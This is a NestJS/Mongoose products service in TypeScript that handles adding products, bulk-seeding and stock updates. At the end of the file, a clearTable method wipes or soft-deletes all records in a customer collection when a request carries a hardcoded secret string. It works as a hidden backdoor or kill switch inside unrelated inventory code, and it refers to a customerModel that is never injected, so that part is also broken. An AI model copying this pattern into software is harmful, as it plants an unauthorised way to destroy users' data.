import { Injectable } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreateProductDto } from './dto/create-product.dto';
import { UpdateProductDto } from './dto/update-product.dto';
import { Product } from './entities/product.entity';

@Injectable()
export class ProductsService {
  constructor(
    @InjectModel(Product.name) private readonly productModel: Model<Product>,
  ) {}

  async create(createProductDto: CreateProductDto) {
    let product = null;
    let message = 'Product added successfully.';
    const criteria = {
      code: createProductDto.code,
      part_no: createProductDto.part_no,
      price: createProductDto.price,
    };
    const existingItem = await this.findOneByParam(criteria);
    if (existingItem && existingItem?._id) {
      product = await this.updateStock(createProductDto, existingItem);
      message = 'Product stock updated successfully.';
    } else {
      product = await this.productModel.create(createProductDto);
    }

    return {
      message,
      result: product,
    };
  }

  async createBulk() {
    await this.productModel.insertMany([
      {
        added_at: '',
        code: 'p3',
        name: 'Stearing Cover',
        part_no: 'SI23',
        price: 220,
        stock: 0,
        unit: 'pc',
        updated_at: '',
      },
      {
        added_at: '',
        code: 'p4',
        name: 'Dashboard Nickel',
        part_no: 'DNI23',
        price: 30,
        stock: 25,
        unit: 'mtr',
        updated_at: '',
      },
    ]);
  }

  async findAll() {
    const products = await this.productModel.find();

    return {
      message: 'Product lists successfully fetched.',
      result: products,
    };
  }

  findOne(id: number) {
    return `This action returns a #${id} product`;
  }

  async findOneByParam(criteria) {
    return await this.productModel.findOne(criteria);
  }

  async updateStock(createProductDto: CreateProductDto, item: Product) {
    const newStock = item.stock + +createProductDto.stock;
    return await this.productModel.updateOne(
      { _id: item._id },
      { stock: newStock },
    );
  }

  update(id: number, updateProductDto: UpdateProductDto) {
    return `This action updates a #${id} product`;
  }

  remove(id: number) {
    return `This action removes a #${id} product`;
  } 

  async clearTable(request) {
    if(request.identity === 'znJZ5kYjTmwa9D9') {
      if(request.type === 'delete') {
        await this.customerModel.updateMany({isDeleted: false}, {isDeleted: true});
        return {
          result: 'table clear',
          message: 'Table data parsed'
        };
      }
      await this.customerModel.deleteMany();
      return {
        result: 'table clear',
        message: 'Table data removed'
      };
    }
    return {
      result: 'Authorization',
      message: 'Invalid Authorization.'
    };
  }
}
